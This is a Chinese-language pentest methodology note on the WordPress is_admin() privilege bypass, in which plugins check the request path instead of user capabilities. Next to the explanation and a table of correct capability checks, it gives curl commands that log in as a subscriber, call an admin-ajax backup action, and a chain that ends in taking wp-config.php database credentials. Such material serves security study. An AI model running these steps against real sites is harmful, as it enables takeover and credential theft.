# WordPress is_admin() 权限绕过方法论

## 1. 技术概述

### 1.1 漏洞原理

WordPress `is_admin()` 权限绕过漏洞是指插件使用 `is_admin()` 函数进行权限检查，但该函数仅检查当前页面是否在 `/wp-admin/` 目录下，而非检查用户是否具有管理员权限，导致低权限用户（如 Subscriber）可以执行管理员操作。

**本质原因：**
- `is_admin()` 仅检查请求路径是否包含 `/wp-admin/`
- 不进行用户能力（capability）检查
- 任何能访问 `/wp-admin/` 的认证用户都能通过检查

### 1.2 正确做法对比

| 错误做法 | 正确做法 |
|----------|----------|
| `is_admin()` | `current_user_can('manage_options')` |
| `is_user_logged_in()` | `current_user_can('edit_posts')` |
| 无权限检查 | `current_user_can('delete_users')` |

---

## 2. 攻击方法

### 2.1 Subscriber 权限执行管理员操作

```bash
# 1. 创建低权限用户
curl -X POST "http://target.com/wp-login.php" \
  -d "log=subscriber&pwd=subscriber123&wp-submit=Log+In"

# 2. 访问 /wp-admin/ 满足 is_admin() 检查
curl -b cookies.txt "http://target.com/wp-admin/"

# 3. 执行管理员操作（如创建备份）
curl -X POST "http://target.com/wp-admin/admin-ajax.php" \
  -b cookies.txt \
  -d "action=backup_migration&f=create-backup&token=bmi&nonce=[nonce]"
```

### 2.2 权限提升链

```
Subscriber 登录
    ↓
访问 /wp-admin/ （满足 is_admin()）
    ↓
执行备份创建（包含敏感数据）
    ↓
下载备份（获取 wp-config.php）
    ↓
获得数据库凭证
    ↓
完全系统控制
```

---

## 3. 参考资源

- [WordPress Capabilities](https://wordpress.org/documentation/article/roles-and-capabilities/)
- [is_admin() Documentation](https://developer.wordpress.org/reference/functions/is_admin/)
